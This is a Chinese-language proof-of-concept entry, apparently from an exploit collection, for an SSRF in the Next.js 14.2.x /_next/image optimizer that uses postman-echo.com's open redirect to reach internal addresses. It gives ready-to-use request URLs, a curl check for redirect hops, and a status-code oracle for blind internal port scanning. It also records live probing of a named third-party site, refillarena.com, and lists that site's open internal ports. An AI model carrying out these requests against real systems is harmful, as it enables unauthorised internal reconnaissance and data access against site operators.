# Next.js /_next/image 图片优化器 SSRF：302 跳转绕过内网校验（用 postman-echo 做不拦私网的跳板）

- **code**: nextjs-image-optimizer-ssrf-302-redirect-bypass
- **kind**: poc
- **category**: ssrf
- **component**: Next.js 14.2.x image-optimizer
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: refillarena.com（Next.js 14.2.35）实测：/ _next/image 经 postman-echo 302 跳转到 http://127.0.0.1:3000/favicon.ico 返回 200 image/x-icon 2662 字节，与公网 favicon 字节完全一致（sha256 前缀 af81ac0afb421bf8）；对照 direct http 参数 400 not allowed、direct https:3000 500。端口盲测得出 127.0.0.1:3000/443/2019 开放，其余常见端口及 172.17/172.18/172.19/10.0.0.1/192.168.1.1 全关。
- **tags**: ssrf,nextjs,image-optimizer,open-redirect,postman-echo,内网探测
- **created_at**: 2026-11-08T01:28:35.437Z
- **engine**: https://refillarena.com

## 描述

Next.js /_next/image 只校验首跳 url 参数（http 协议被 400 拒，https 主机名不限），但 fetch 默认 follow 重定向且不校验跳转后的内网目标。用公开的、不做内网过滤的 302 跳板（httpbin/httpbingo/httpbun 的 redirect-to 会 403 拦截私网目标，postman-echo.com/redirect-to 不拦）即可让优化器访问 http://127.0.0.1 / 内网 IP。回显受图片门限制：上游 2xx 非图片 → 400 "The requested resource isn't a valid image."；上游非 2xx → 原样透传状态码；上游 2xx 图片 → 200 返回图片。故可做内网端口/路径盲测与内网图片读取，但读不回文本。

## 用法

```
1) 首跳探测协议：https://T/_next/image?url=http%3A%2F%2F127.0.0.1%2F → 400 '"url" parameter is not allowed' 说明只收 https；https://T/_next/image?url=https%3A%2F%2F127.0.0.1%2Ffavicon.ico → 500 说明未被内网白名单拦但无 TLS 服务。
2) 跳板选型：先 curl "https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A3000%2Ffavicon.ico&status_code=302" 验证跳板是否拦私网（拦则 403 "redirect target is an internal address"）；换 postman-echo.com/redirect-to。
3) 打内网：https://T/_next/image?url=<urlencode(https://postman-echo.com/redirect-to?url=<urlencode(http://127.0.0.1:3000/favicon.ico)>&status_code=302)>&w=64&q=75
4) 端口判定：500=连接失败/关闭；400 "isn't a valid image"=上游 2xx 非图片（端口开放）；其它 4xx=上游状态透传（开放）。读图必须命中 image/* 资源（favicon.ico 最好用）。
```
